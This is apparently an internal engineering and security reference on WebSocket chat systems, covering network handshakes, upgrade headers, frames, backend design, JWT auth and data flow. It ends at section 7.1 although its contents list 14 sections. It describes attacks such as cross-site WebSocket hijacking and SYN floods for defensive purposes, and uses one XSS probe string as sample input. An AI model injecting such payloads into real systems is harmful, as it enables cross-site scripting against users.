# WebSocket Communication System — Deep Engineering & Security Breakdown

> **Classification:** Internal Engineering / Security Reference  
> **Audience:** Engineers, Security Reviewers, Architects, Interview Candidates  
> **Scope:** Full-stack, packet-level, attack-surface-complete breakdown of a production WebSocket system  

---

## Table of Contents

1. [User Journey (Narrative)](#1-user-journey-narrative)
2. [Network Layer Flow](#2-network-layer-flow)
3. [Application Layer Flow](#3-application-layer-flow)
4. [Backend Architecture](#4-backend-architecture)
5. [Authentication & Authorization Flow](#5-authentication--authorization-flow)
6. [Data Flow](#6-data-flow)
7. [Security Controls](#7-security-controls)
8. [Attack Surface Mapping](#8-attack-surface-mapping)
9. [Attack Scenarios](#9-attack-scenarios)
10. [Failure Points](#10-failure-points)
11. [Mitigations](#11-mitigations)
12. [Observability](#12-observability)
13. [Scaling Considerations](#13-scaling-considerations)
14. [Interview Questions](#14-interview-questions)

---

## 1. User Journey (Narrative)

### Scenario: User Opens a Real-Time Chat Application

This narrative traces every real action, in order, from the moment a user clicks a link to the moment they see a live message from another user. No steps are skipped.

---

### T=0ms — User clicks a link or navigates to `https://chat.example.com`

**What the user sees:** A browser loading spinner.  
**What actually happens:**

1. The browser checks its internal DNS cache for `chat.example.com`. TTL on prior lookup may have expired.
2. If no cache hit, the OS resolver is queried. The OS checks `/etc/hosts` (Linux/macOS) or the registry (Windows) first, then forwards to the configured DNS resolver (e.g., `8.8.8.8` or ISP resolver).
3. The resolver performs a recursive lookup (detailed in Section 2).
4. The browser receives an IP address (e.g., `203.0.113.42` — a load balancer or CDN edge node).
5. A TCP connection is initiated to port 443.
6. A TLS 1.3 handshake occurs. The browser verifies the server's certificate chain against trusted CAs in its root store.
7. An HTTP/1.1 or HTTP/2 GET request is issued for `/`.
8. The server returns an HTML document. The browser parses it and discovers JS/CSS assets.
9. Assets are fetched (potentially from a CDN). The JS bundle is parsed and executed.

---

### T=~200–800ms — JavaScript Executes, App Bootstraps

**What the user sees:** A login screen or a loading skeleton UI.  
**What actually happens:**

1. The JS framework (React, Vue, etc.) mounts. It reads local storage or cookies for a stored auth token (JWT or session cookie).
2. If an auth token exists, the app attempts to verify it by calling `GET /api/auth/verify` over HTTPS.
3. The server validates the token (signature, expiry, claims).
4. If valid, the server returns user metadata (user ID, roles, workspace ID).
5. The JS app stores this state in memory (Redux/Vuex/Pinia store or React context).

---

### T=~800ms–1.2s — WebSocket Upgrade Initiated

**What the user sees:** The chat UI appears; a subtle "Connecting…" indicator may flash.  
**What actually happens (critical sequence):**

1. The JS app calls `new WebSocket("wss://chat.example.com/ws?token=<JWT>")`.
2. The browser issues an HTTP/1.1 `GET` request to `/ws` with special upgrade headers (detailed in Section 3).
3. The server (nginx → Node.js/Go/etc.) processes the upgrade handshake.
4. The connection is upgraded from HTTP to the WebSocket protocol (RFC 6455).
5. The server authenticates the token supplied in the query string or `Sec-WebSocket-Protocol` header.
6. A persistent, full-duplex TCP connection is now open. No more HTTP overhead per message.
7. The server registers this connection in an in-memory connection registry (e.g., a Map keyed by user ID or socket ID).
8. The server may join the socket to a "room" or "channel" (via Redis Pub/Sub or an in-process event emitter).

---

### T=~1.2s — User Sends a Message

**What the user sees:** They type "Hello" and press Enter. Their message appears immediately (optimistic UI).  
**What actually happens:**

1. The JS app serializes the message: `JSON.stringify({ type: "message", roomId: "room_42", body: "Hello", clientSeq: 17 })`.
2. This JSON string is passed to `socket.send(payload)`.
3. The browser frames this as one or more WebSocket data frames (opcode 0x1 for text). **Client-to-server frames are always masked** (4-byte masking key XORed with payload — RFC 6455 §5.3).
4. The frame travels over the existing TLS-encrypted TCP connection. No new TCP or TLS handshake is needed.
5. The server receives, unmasks (server never masks), and parses the frame.
6. The server validates: schema, content policy, rate limit, authorization (is this user allowed in room_42?).
7. The message is written to a durable store (PostgreSQL, Cassandra, etc.) and/or published to a message queue (Kafka, Redis Pub/Sub).
8. Workers subscribed to that room receive the event and fan it out to all connected sockets in the room.
9. Each recipient's client receives a server-to-client WebSocket frame and renders the message.

---

### T=ongoing — Heartbeat & Keep-Alive

- The server sends periodic `PING` frames (opcode 0x9). The client must respond with `PONG` frames (opcode 0xA).
- If a PONG is not received within a timeout window (typically 30–60s), the server closes the connection (opcode 0x8).
- The client-side JS SDK detects the close event and attempts reconnection with exponential backoff.

---

### T=session end — Clean Disconnect

1. User closes browser tab → browser sends WebSocket close frame (opcode 0x8, status code 1001 "Going Away").
2. Server receives close frame, echoes it back, marks the socket as closed, removes it from the connection registry, and updates presence state.
3. Other users in the same room receive a server-pushed "user left" event.

---

## 2. Network Layer Flow

### 2.1 DNS Resolution

```
Browser
  |
  |-- check browser DNS cache (e.g., chrome://net-internals/#dns)
  |     HIT --> IP returned immediately
  |     MISS -->
  |
  |--> OS Resolver (libc getaddrinfo / Windows DNS Client)
  |     check /etc/hosts
  |     HIT --> IP returned
  |     MISS -->
  |
  |--> Configured Recursive Resolver (e.g., 8.8.8.8, 1.1.1.1, or ISP)
  |     |
  |     |--> Root Nameserver (13 logical clusters, anycast)
  |     |     "Who handles .com?"
  |     |     <-- Returns .com TLD NS records
  |     |
  |     |--> .com TLD Nameserver (Verisign)
  |     |     "Who handles example.com?"
  |     |     <-- Returns example.com authoritative NS records
  |     |
  |     |--> Authoritative Nameserver (e.g., ns1.example.com / Route53)
  |           "What is the A/AAAA record for chat.example.com?"
  |           <-- Returns: 203.0.113.42, TTL=300
  |
  |<-- Recursive resolver caches and returns IP to OS
  |<-- OS returns IP to browser
```

**Key mechanics:**
- **Recursive resolver:** Does the full lookup on behalf of the client; caches results.
- **Authoritative nameserver:** The definitive source for a zone's records. Does not recurse.
- **TTL poisoning window:** If an attacker can respond before the real authoritative server, they can inject a malicious IP (DNS Cache Poisoning). DNSSEC mitigates this by signing records.
- **DNS over HTTPS (DoH) / DNS over TLS (DoT):** Encrypts the DNS query itself. Without these, a network observer can read every domain your client resolves — even if HTTPS is used for the connection.
- **Latency:** A full cold-cache DNS lookup adds ~50–200ms. A warm cache hit is ~0–1ms.

---

### 2.2 TCP Three-Way Handshake

```
Client                          Server (203.0.113.42:443)
  |                                  |
  |---- SYN (seq=x) ---------------->|   Client picks random ISN x
  |                                  |   Server receives, allocates half-open slot
  |<--- SYN-ACK (seq=y, ack=x+1) ---|   Server picks ISN y
  |                                  |
  |---- ACK (ack=y+1) -------------->|   Connection ESTABLISHED
  |                                  |
```

**What each step costs:**
- **SYN:** 1 round-trip time (RTT) to just start. Typical RTT: 1ms (local) to 200ms (cross-continent).
- **SYN-ACK:** Server places connection in SYN queue (not yet established). SYN flood attacks fill this queue.
- **ACK:** Full connection established. Moved from SYN queue to accept queue.

**Failure modes:**
- **SYN flood:** Attacker sends SYNs with spoofed source IPs. Server allocates state for each. Mitigated by SYN cookies (server encodes state in SYN-ACK sequence number, never writes to memory).
- **Port blocking:** Corporate firewalls may block port 443 for WebSocket upgrades. Use standard HTTPS port (443) to avoid this; most firewalls allow it.
- **RST injection:** On-path attacker injects TCP RST packets to tear down connections.

---

### 2.3 TLS 1.3 Handshake

TLS 1.3 reduces the handshake from 2 RTTs (TLS 1.2) to **1 RTT** for new connections, and **0 RTT** for session resumption (with caveats).

```
Client                                    Server
  |                                           |
  |--- ClientHello --------------------------->|
  |    - TLS version: 1.3                     |
  |    - Supported cipher suites              |
  |      (e.g., TLS_AES_128_GCM_SHA256)       |
  |    - Client random (32 bytes)             |
  |    - Key share (ECDH public key)          |
  |    - SNI: chat.example.com                |
  |                                           |
  |<-- ServerHello ----------------------------| 
  |    - Selected cipher suite                |
  |    - Server random (32 bytes)             |
  |    - Server ECDH public key               |
  |    [Both sides now derive session keys    |
  |     from ECDH shared secret + randoms]    |
  |                                           |
  |<-- {EncryptedExtensions} -----------------|  All subsequent traffic encrypted
  |<-- {Certificate} -------------------------|
  |<-- {CertificateVerify} ------------------|  Server proves private key ownership
  |<-- {Finished} ----------------------------|
  |                                           |
  |--- {Finished} ---------------------------->|  Client confirms
  |                                           |
  |=== Encrypted Application Data ============|  HTTP request sent here
```

**Key mechanics:**

- **ECDH Key Exchange:** Neither side sends the session key over the wire. Each side generates an ephemeral key pair. The shared secret is derived from `client_private * server_public` (same as `server_private * client_public` — elliptic curve math). This provides **Forward Secrecy**: compromising the server's long-term private key later does not decrypt past sessions.
- **Certificate verification:**
  - Server sends its cert chain: `chat.example.com cert → Intermediate CA cert → Root CA`.
  - Client checks: (a) cert was signed by a trusted CA in its root store, (b) hostname matches the cert's CN/SAN, (c) cert is not expired, (d) cert is not revoked (OCSP stapling is the performant way — server includes a signed OCSP response in the handshake).
- **SNI (Server Name Indication):** Sent in plaintext in `ClientHello`. This tells the server which cert to present (important for multi-tenant servers). A network observer can read the SNI even with TLS — it reveals the hostname. ECH (Encrypted Client Hello) is the fix, still rolling out.
- **Session resumption (0-RTT):** Client reuses a PSK (Pre-Shared Key) from a prior session. The server sends a `NewSessionTicket` after handshake. Client can include early data (application data) in its first flight. **Security caveat:** 0-RTT data has no replay protection. A network attacker can replay the early data. Never use 0-RTT for non-idempotent requests (POST, state-mutating WebSocket messages).

---

### 2.4 Full Network Layer ASCII Diagram

```
  USER DEVICE
  +---------------------------+
  | Browser Process           |
  |  +---------------------+  |
  |  | DNS Cache           |  |
  |  | TCP Socket Pool     |  |
  |  | TLS Session Cache   |  |
  |  +---------------------+  |
  +------------|--------------+
               | Port 443 (TCP)
               | Encrypted (TLS 1.3)
               v
  ISP NETWORK / INTERNET BACKBONE
  +------------------------------------------+
  | Potential observation points:            |
  |  - ISP DPI (sees SNI, not payload)       |
  |  - BGP hijack risk (route manipulation)  |
  |  - DNS resolver (sees plaintext queries) |
  +------------------------------------------+
               |
               v
  CDN EDGE NODE (e.g., Cloudflare PoP, closest to user)
  +---------------------------+
  | TLS Termination           |  <-- TLS terminates HERE for CDN-proxied sites
  | DDoS Scrubbing            |      Server sees CDN IP, not client IP unless
  | WAF (Layer 7 rules)       |      X-Forwarded-For / CF-Connecting-IP passed
  | Static Asset Cache        |
  +------------|--------------+
               | Internal TLS or mTLS to origin
               v
  LOAD BALANCER (e.g., AWS ALB, nginx, HAProxy)
  +---------------------------+
  | SSL Offloading            |
  | L7 Routing (path/host)    |
  | Health Checks             |
  | Sticky Sessions (optional)|
  +---+---+---+---------------+
      |   |   |
      v   v   v
  APP SERVER POOL (WebSocket servers)
  +--------+ +--------+ +--------+
  | WS Srv | | WS Srv | | WS Srv |
  | Node 1 | | Node 2 | | Node 3 |
  +---+----+ +---+----+ +---+----+
      |           |           |
      +-----------+-----------+
                  |
             Redis Pub/Sub
          (fan-out across nodes)
```

---

### 2.5 Latency Budget (Typical Production)

| Step | Typical Duration |
|------|-----------------|
| DNS resolution (cold) | 50–150ms |
| TCP handshake (1 RTT) | 20–200ms |
| TLS 1.3 handshake (1 RTT) | 20–200ms |
| HTTP request + response | 20–200ms |
| WebSocket upgrade | 1 RTT (reuses TCP/TLS) |
| **Total to first WS frame** | **~200ms – 1s** |

---

## 3. Application Layer Flow

### 3.1 The WebSocket Upgrade — HTTP Request Mechanics

WebSocket is not its own protocol from scratch. It begins as HTTP/1.1 and is **upgraded in-place**. HTTP/2 has a different upgrade mechanism (`:protocol` pseudo-header via CONNECT).

**Upgrade Request (client → server):**

```
GET /ws HTTP/1.1
Host: chat.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Sec-WebSocket-Protocol: chat.v1, chat.v2   (optional subprotocol negotiation)
Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits
Origin: https://chat.example.com
Cookie: session_id=abc123
Authorization: Bearer eyJhbGci...  (if not using cookie)
```

**Field-by-field breakdown:**

- `Upgrade: websocket` — Tells the server the client wants to switch protocols.
- `Connection: Upgrade` — Must be present. Tells the proxy not to strip the `Upgrade` header.
- `Sec-WebSocket-Key` — A random base64-encoded 16-byte value. The server must echo back a derived value to prove it read the WebSocket spec (not a generic HTTP server echoing back arbitrary values). Computed as: `Base64(SHA1(key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"))`. This is **NOT** for security — it's to prevent proxies from caching WebSocket responses.
- `Sec-WebSocket-Version: 13` — Spec version. Must be 13 per RFC 6455. Reject anything else.
- `Sec-WebSocket-Protocol` — Proposed subprotocols. Server picks one and includes it in the 101 response.
- `Sec-WebSocket-Extensions: permessage-deflate` — Negotiates per-message compression. Dramatically reduces bandwidth for text-heavy workloads (chat, JSON events). Can be exploited (CRIME-style attacks if not implemented carefully).
- `Origin` — The origin of the page that opened the WebSocket. **Critical security header.** Server MUST validate this against an allowlist. Without validation, any page on any domain can open a WebSocket to your server using the victim's cookies (CSWSH — Cross-Site WebSocket Hijacking).

**Upgrade Response (server → client):**

```
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
Sec-WebSocket-Protocol: chat.v2
Sec-WebSocket-Extensions: permessage-deflate
```

- `101 Switching Protocols` — The HTTP connection is now a WebSocket connection. HTTP semantics no longer apply.
- After this response, both sides speak the WebSocket framing protocol (RFC 6455), not HTTP.

---

### 3.2 WebSocket Frame Structure

```
  0                   1                   2                   3
  0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
 +-+-+-+-+-------+-+-------------+-------------------------------+
 |F|R|R|R| opcode|M| Payload len |    Extended payload length    |
 |I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |
 |N|V|V|V|       |S|             |   (if payload len==126/127)   |
 | |1|2|3|       |K|             |                               |
 +-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +
 |     Extended payload length continued, if payload len == 127  |
 + - - - - - - - - - - - - - - -+-------------------------------+
 |                               |Masking-key, if MASK set to 1  |
 +-------------------------------+-------------------------------+
 | Masking-key (continued)       |          Payload Data         |
 +-------------------------------- - - - - - - - - - - - - - - - +
 :                     Payload Data continued ...                 :
 + - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
 |                     Payload Data continued ...                 |
 +---------------------------------------------------------------+
```

**Opcodes:**
| Opcode | Meaning |
|--------|---------|
| 0x0 | Continuation frame |
| 0x1 | Text frame (UTF-8) |
| 0x2 | Binary frame |
| 0x8 | Close |
| 0x9 | Ping |
| 0xA | Pong |

**FIN bit:** If set, this is the final fragment of a message. Large messages can be split across multiple frames with FIN=0, FIN=0, …, FIN=1.

**Masking:** Client-to-server frames MUST be masked. Server-to-client frames MUST NOT be masked. The 4-byte masking key is XORed over the payload. This is not encryption — any observer with the frame can trivially unmask it (the key is in the frame). Its purpose is to prevent poisoning of HTTP proxies that cache responses — masked data breaks any proxy that tries to interpret it as HTTP.

---

### 3.3 HTTP Request Lifecycle for REST Endpoints (Authentication, etc.)

Before the WebSocket connection, the app makes standard HTTPS API calls:

```
Client JS                          API Server
    |                                  |
    |--- GET /api/auth/verify -------->|
    |    Headers:                      |
    |      Authorization: Bearer <JWT> |   OR
    |      Cookie: session=<token>     |
    |    Accept: application/json      |
    |                                  |
    |                          [middleware chain]
    |                          1. Parse JWT / decrypt session cookie
    |                          2. Verify signature / session store lookup
    |                          3. Check expiry
    |                          4. Load user from DB/cache
    |                          5. Attach user to request context
    |                          6. Call route handler
    |                                  |
    |<-- 200 OK ----------------------|
    |    Content-Type: application/json|
    |    Cache-Control: no-store       |
    |    {                             |
    |      "userId": "u_123",          |
    |      "email": "user@example.com" |
    |      "roles": ["member"]         |
    |    }                             |
```

**Cookie mechanics:**
- `HttpOnly` flag: JS cannot read the cookie. Mitigates XSS-based cookie theft.
- `Secure` flag: Cookie only sent over HTTPS. Never sent over HTTP.
- `SameSite=Strict`: Cookie never sent cross-origin. Mitigates CSRF.
- `SameSite=Lax`: Cookie sent on top-level navigations (clicking links), not on subresource requests cross-origin.
- `SameSite=None; Secure`: Required for intentionally cross-origin cookies (e.g., OAuth flows, embedded widgets).

**Parameter parsing:**
- Query params: URL-decoded, then split on `&`, key-value split on `=`. Injection risk if not sanitized before DB queries.
- JSON body: Parsed by a JSON library. Risk: `__proto__` pollution in older Node.js versions, deeply nested objects causing DoS (set `maxDepth` in parsers).
- Headers: Case-insensitive. HTTP/2 lowercases all headers. Parsers must normalize case before comparison.

---

## 4. Backend Architecture

### 4.1 Component Overview

```
                         ┌──────────────────────────────────────────┐
                         │          API GATEWAY / LOAD BALANCER      │
                         │   (nginx, AWS ALB, Traefik, Kong)         │
                         │   - TLS termination                       │
                         │   - Rate limiting (token bucket/leaky     │
                         │     bucket per IP or user)                │
                         │   - Path routing (/api/*, /ws, /static/*) │
                         └──────────────────┬───────────────────────┘
                                            │
              ┌─────────────────────────────┼─────────────────────────────┐
              │                             │                             │
              ▼                             ▼                             ▼
   ┌──────────────────┐        ┌───────────────────────┐      ┌──────────────────┐
   │   Auth Service   │        │  WebSocket Service     │      │   REST API       │
   │   (stateless)    │        │  (stateful per conn)   │      │   Service        │
   │                  │        │                        │      │                  │
   │ - JWT issue/verify        │ - Upgrade handler      │      │ - CRUD endpoints │
   │ - Session mgmt   │        │ - Connection registry  │      │ - Business logic │
   │ - OAuth flows    │        │ - Room/channel logic   │      │ - Validation     │
   │ - Token rotation │        │ - Heartbeat manager    │      │                  │
   └────────┬─────────┘        └──────────┬────────────┘      └────────┬─────────┘
            │                             │                             │
            └─────────────────────────────┼─────────────────────────────┘
                                          │
              ┌───────────────────────────┼───────────────────────────┐
              │                           │                           │
              ▼                           ▼                           ▼
   ┌──────────────────┐       ┌───────────────────────┐  ┌──────────────────────┐
   │   Redis Cluster  │       │   Message Broker       │  │   Primary Database   │
   │                  │       │   (Kafka / RabbitMQ)   │  │   (PostgreSQL /      │
   │ - Session cache  │       │                        │  │    Cassandra /       │
   │ - Rate limit     │       │ - Message persistence  │  │    DynamoDB)         │
   │   counters       │       │ - Fan-out to consumers │  │                      │
   │ - Pub/Sub        │       │ - Replay on reconnect  │  │ - Messages           │
   │   (room events)  │       │                        │  │ - User accounts      │
   │ - Presence data  │       └──────────┬────────────┘  │ - Room membership    │
   │ - WS conn map    │                  │               └──────────────────────┘
   └──────────────────┘                  ▼
                              ┌───────────────────────┐
                              │   Worker Pool          │
                              │                        │
                              │ - Message fanout       │
                              │ - Notification push    │
                              │ - Email delivery       │
                              │ - Audit log writing    │
                              └───────────────────────┘
```

---

### 4.2 WebSocket Server Internals

The WebSocket server is fundamentally **stateful** — unlike REST APIs where any server can handle any request, each WebSocket server holds live socket objects in memory. This has profound scaling implications.

**Connection Registry (in-memory):**
```
connectionRegistry = Map<socketId, {
  userId,
  roomIds: Set<roomId>,
  socket: WebSocket,
  connectedAt: timestamp,
  lastPingAt: timestamp,
  metadata: { ip, userAgent, deviceId }
}>
```

**Room Registry (in-memory + Redis):**
```
roomRegistry = Map<roomId, Set<socketId>>
// Also mirrored in Redis for cross-node fan-out:
// SADD room:{roomId}:sockets {serverHostname}:{socketId}
```

**Message processing pipeline (per incoming frame):**

```
Receive Frame
     │
     ▼
Unmask + Reassemble (if fragmented)
     │
     ▼
Parse JSON / decode binary
     │
     ▼
Schema validation (Zod, Joi, Ajv, etc.)
     │
     ▼
Auth/Authz middleware
  - Is socket authenticated?
  - Does user have permission for this room/action?
     │
     ▼
Rate limit check (per user, per room)
     │
     ▼
Business logic handler
     │
     ├──▶ Write to DB (async, non-blocking)
     │
     ├──▶ Publish to Redis Pub/Sub or Kafka
     │
     └──▶ Optionally ACK back to sender
```

---

### 4.3 Sync vs Async Flows

| Flow | Synchronous | Asynchronous |
|------|-------------|--------------|
| Auth validation | Yes — must complete before handler runs | No |
| Message DB write | No — write async, don't block sender | Yes (Kafka/worker) |
| Message fanout | No — publish to broker, let workers fan out | Yes |
| Presence updates | Usually async (Redis EXPIRE + Pub/Sub) | Yes |
| Push notifications | Fully async (separate worker/queue) | Yes |
| Rate limit check | Yes (Redis INCR is fast enough, ~0.1ms) | No |

---

### 4.4 Database Interactions

**Message storage:**
- Messages written to a write-optimized store. For chat: Cassandra (partition by roomId + timebucket) or PostgreSQL (if scale allows).
- Cassandra schema example:
```sql
CREATE TABLE messages (
  room_id UUID,
  bucket TIMESTAMP,    -- e.g., truncated to hour
  message_id TIMEUUID, -- time-ordered UUID
  sender_id UUID,
  body TEXT,
  created_at TIMESTAMP,
  PRIMARY KEY ((room_id, bucket), message_id)
) WITH CLUSTERING ORDER BY (message_id ASC);
```
- PostgreSQL with partitioning: `messages` table partitioned by `room_id` and time range.

**Read path:**
- Recent messages (last 50) served from Redis LRU cache (key: `room:{id}:messages:recent`).
- Older messages fetched from DB with cursor-based pagination.

**Connection state:**
- Socket-to-server mapping stored in Redis: `SETEX conn:{socketId} 60 {serverId}` (TTL refreshed by heartbeat).
- Used for targeted message delivery (route a message to the specific server holding the socket).

---

### 4.5 Redis Pub/Sub for Cross-Node Fan-Out

This is the critical mechanism that makes multi-server WebSocket systems work:

```
User A (on Server 1) sends message to Room 42
         │
         ▼
Server 1 publishes: PUBLISH room:42 "{...message payload...}"
         │
         ├──▶ Server 1 (subscribed to room:42) receives → sends to local sockets in room
         │
         ├──▶ Server 2 (subscribed to room:42) receives → sends to local sockets in room
         │
         └──▶ Server 3 (subscribed to room:42) receives → sends to local sockets in room
```

**Redis Pub/Sub caveats:**
- Not durable: if a server is down when the message is published, it misses it.
- Not persistent: messages are not stored in Redis Pub/Sub.
- Prefer Kafka for durability: consumers can replay messages after reconnecting.

---

## 5. Authentication & Authorization Flow

### 5.1 Token-Based Auth (JWT)

**JWT Structure:**
```
Header.Payload.Signature
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9
  .
eyJzdWIiOiJ1XzEyMyIsInJvbGVzIjpbIm1lbWJlciJdLCJpYXQiOjE2OTg0MDAwMDAsImV4cCI6MTY5ODQwMzYwMH0
  .
<RSA-SHA256 signature>
```

**Payload claims:**
- `sub` (subject): User ID. The primary identity claim.
- `iat` (issued at): Unix timestamp. Used to detect token reuse after password reset.
- `exp` (expiry): Unix timestamp. Short-lived (15–60 min for access tokens).
- `jti` (JWT ID): Unique ID per token. Used for revocation (store revoked JTIs in Redis).
- `roles` / `permissions`: Authorization claims embedded in the token.
- `aud` (audience): Which service this token is for. Prevents using a token issued for Service A against Service B.

**Signing algorithms:**
- `HS256`: HMAC with SHA-256. Symmetric — same secret used to sign and verify. Only suitable if the same service signs and verifies. All services that need to verify must hold the secret.
- `RS256`: RSA with SHA-256. Asymmetric — private key signs, public key verifies. Services only need the public key to verify. **Preferred for microservices.**
- `ES256`: ECDSA with P-256. Shorter signatures than RS256, same security. Preferred over RS256 in bandwidth-sensitive environments.

---

### 5.2 WebSocket Authentication — The Problem

HTTP has per-request auth (headers). WebSocket is a persistent connection — auth happens **once at upgrade time**, then the connection is trusted for its lifetime.

**Methods:**

1. **Query Parameter Token:**
   ```
   wss://chat.example.com/ws?token=eyJhbGci...
   ```
   - Simple, works everywhere.
   - **Security risk:** Query parameters appear in server access logs, browser history, proxy logs, and Referer headers. Token may be logged in plaintext.
   - Mitigate: use short-lived tokens (< 60s TTL) specifically issued for the WebSocket upgrade ("WS ticket" pattern).

2. **Cookie (session cookie or JWT cookie):**
   ```
   Cookie: session=<token>
   ```
   - Sent automatically by the browser on the upgrade request.
   - Works well for same-origin WebSocket connections.
   - **CSRF risk:** A malicious site can open a WebSocket to your server using the victim's cookies (CSWSH — see Section 9). Mitigate with `Origin` header validation.

3. **`Sec-WebSocket-Protocol` Header:**
   ```
   Sec-WebSocket-Protocol: token.eyJhbGci...
   ```
   - A hack — tokens don't belong in the subprotocol header, but it's sometimes done to avoid query param logging.
   - Less readable, same security properties.

4. **First-message auth (post-upgrade):**
   - Accept the WebSocket upgrade without auth, then wait for the first client message to contain credentials.
   - If credentials don't arrive within N seconds, close the connection.
   - Keeps the upgrade endpoint uniform; allows more flexibility.
   - Risk: the unauthenticated WebSocket endpoint is an attack surface for resource exhaustion.

---

### 5.3 Authorization — Per-Message, Not Just Per-Connection

A connected WebSocket user is authenticated (we know who they are), but each action must be authorized (do they have permission for this specific resource?):

```
Incoming message: { type: "sendMessage", roomId: "room_99", body: "..." }

Authorization checks:
1. Is user a member of room_99? (DB or cache lookup)
2. Is user banned from room_99?
3. Has user exceeded room_99 message rate limit?
4. Is room_99 in a "read-only" state?
5. Does user's role allow sending messages (not just reading)?
```

This must happen per-message, not once at connection time. A user's permissions can change after the WebSocket is established (e.g., they are kicked from a room). The server must handle mid-connection permission changes:
- Server can push a "permissions updated" event to the client.
- Server validates permissions on each relevant operation.
- On permission revocation, server sends a close frame or an error event.

---

### 5.4 Trust Boundaries

```
[ Browser / Client ]
        │  Untrusted. Assume all inputs are hostile.
        │  User controls everything in the browser (JS, cookies, WS frames).
        ▼
[ Load Balancer / API Gateway ]
        │  First enforcement point. Rate limiting, DDoS mitigation, TLS termination.
        │  Does NOT know business logic. Cannot enforce authorization.
        ▼
[ Auth Service ]
        │  Issues and validates tokens. Trusted by downstream services.
        │  If compromised, entire system is compromised.
        ▼
[ WebSocket Server ]
        │  Trusts the auth token. Must not trust client-provided user IDs or roles.
        │  All authorization decisions based on validated token claims, not user input.
        ▼
[ Message Broker / Database ]
        │  Trusted internal systems. Should still enforce minimal access controls
        │  (no WebSocket server should directly DROP TABLE).
        ▼
[ Worker Services ]
        │  Consume from broker. Trust broker. Must validate payloads from broker
        │  (broker can be compromised, or malformed messages can be injected).
```

---

### 5.5 Token Storage and Rotation

**Access Token (short-lived, ~15 min):**
- Stored in JS memory (e.g., `useState`, Vuex store).
- Never in localStorage (XSS readable).
- Never in a non-HttpOnly cookie (XSS readable).

**Refresh Token (long-lived, ~30 days):**
- Stored in HttpOnly, Secure, SameSite=Strict cookie.
- Not accessible to JS.
- Used only to get new access tokens from `/api/auth/refresh`.

**Rotation logic:**
1. Access token expires.
2. Client detects 401 response or proactively checks token expiry (`exp` claim).
3. Client calls `/api/auth/refresh` with the refresh token cookie.
4. Server validates refresh token (checks against DB — refresh tokens are stored server-side to allow revocation).
5. Server issues new access token + new refresh token (rotate on use).
6. Old refresh token is invalidated (one-time use).

**WebSocket re-auth on token expiry:**
- The WebSocket connection persists past the access token expiry.
- Options:
  a. Server tracks token expiry and sends a "re-authenticate" event when it expires.
  b. Client silently refreshes the access token and sends a `{ type: "reauth", token: newToken }` message.
  c. Server closes the connection on expiry; client reconnects with a fresh token.

---

## 6. Data Flow

### 6.1 Message Lifecycle — Data Transformation Map

```
Browser JS                   WS Server              DB / Broker
    │                             │                      │
    │  Raw user input:            │                      │
    │  "Hello <script>alert(1)</script>"                 │
    │                             │                      │
    ├─ Client-side:               │                      │
    │  JSON.stringify({           │                      │
    │    body: userInput          │                      │  
    │  })                         │                      │
    │  → WebSocket frame          │                      │
    │  → masking applied          │                      │
    │                             │                      │
    │─────── frame ──────────────>│                      │
    │                             │                      │
    │                             ├─ Unmask frame        │
    │                             ├─ JSON.parse()        │
    │                             ├─ Schema validate     │
    │                             │  (body: string,      │
    │                             │   maxLength: 4096)   │
    │                             ├─ Sanitize:           │
    │                             │  strip/escape HTML   │
    │                             │  (server-side only)  │
    │                             ├─ Enrich:             │
    │                             │  add serverId,       │
    │                             │  messageId (UUID),   │
    │                             │  timestamp,          │
    │                             │  senderId from token │
    │                             │  (NOT from payload!) │
    │                             │                      │
    │                             ├────── INSERT ───────>│
    │                             │  {                   │
    │                             │    message_id,       │
    │                             │    room_id,          │
    │                             │    sender_id,        │
    │                             │    body: escaped,    │
    │                             │    created_at        │
    │                             │  }                   │
    │                             │                      │
    │                             ├── PUBLISH to Kafka ─>│
    │                             │  { full message }    │
    │                             │                      │
    │                    Workers consume from Kafka       │
    │                    Fan out to subscribed sockets    │
    │                             │                      │
    │<─── server frame ──────────-│                      │
    │  {                          │                      │
    │    messageId,               │                      │
    │    senderId,                │                      │
    │    senderName,              │                      │
    │    body: escaped_HTML,      │                      │
    │    timestamp                │                      │
    │  }                          │                      │
    │                             │                      │
    │  Client renders:            │                      │
    │  innerHTML = DOMPurify      │                      │
    │    .sanitize(msg.body)      │                      │
    │  (defense-in-depth)         │                      │
```

---

### 6.2 Serialization Formats

**JSON (most common):**
- Human-readable, universally supported.
- Verbose: `{"type":"msg","body":"hi"}` is 26 bytes.
- No schema enforcement without a validator.
- Vulnerabilities: prototype pollution (`__proto__`), key collision, deeply nested DoS.

**MessagePack:**
- Binary JSON. Smaller payloads (~30% smaller than JSON for typical chat messages).
- Same data model as JSON, no schema.
- Useful for mobile clients where bandwidth matters.

**Protocol Buffers (protobuf):**
- Schema-first binary serialization. Strongly typed.
- Much smaller than JSON, faster to encode/decode.
- Requires `.proto` file coordination between client and server.
- Better for high-frequency financial data or game state than chat.

**CBOR, Avro, Thrift:** Similar binary alternatives with different tradeoffs.

**In practice for WebSocket chat:** JSON is standard. Use MessagePack if payload size is a concern. Use protobuf for internal service-to-service messages (Kafka events).

---

### 6.3 Where Data Is Validated

| Validation Type | Location | Why |
|----------------|----------|-----|
| Type/schema check | Server, immediately after parse | Client-side validation is UI sugar only |
| Length limits | Server (and DB constraints) | Prevent storage exhaustion, DoS |
| Auth claims (userId, etc.) | Server — take from token, not payload | Clients can send any userId in payload |
| HTML escaping | Server before write; client before render | Defense in depth against XSS |
| SQL injection prevention | ORM / parameterized queries | Never string-concatenate user input into SQL |
| Rate limiting | Gateway + server | Prevent spam, DoS |
| Content policy | Async (ML model, regex) | Not on the hot path — offload to worker |

---

## 7. Security Controls

### 7.1 Encryption in Transit

- All WebSocket traffic uses `wss://` (WebSocket Secure = WebSocket over TLS). Never `ws://` in production.
- TLS 1.2 minimum; TLS 1.3 preferred.
